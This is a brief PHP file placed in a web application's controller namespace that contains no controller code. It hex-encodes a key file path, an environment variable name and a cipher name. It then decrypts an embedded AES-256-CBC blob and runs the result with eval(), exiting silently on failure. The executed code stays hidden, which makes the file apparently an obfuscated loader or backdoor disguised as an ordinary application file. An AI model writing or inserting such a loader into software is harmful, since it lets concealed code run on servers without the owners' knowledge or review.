<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('vR5uD9Omn9vFV4T4i9MMFw==');

$c=base64_decode(

'D3kjVv8zXlfFBD5vtBn6KMGLfPlHK6ninslMfOXSfwPwm8dUXe+gmFMnchiRPB5wRf01phyVS1zO' .
'enVTvOQk6v82vqvHHicVYGfvODoJD7pi8w9uTJ069qzlJwSJ+vldkTQk8GRtw9cGFLO9H+ye5Gab' .
'5+mby/OBcdEa+wuHgqbqU+QRkmS8fC9mv4H6Up4ewzVDXMb8GQHvKvErn7pzDLQg15amDOJbrlse' .
'XNkLtM0AY4yYCJV1PHK1aPPiv9ethioNSQFebc2D6pdT4pR2Mw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

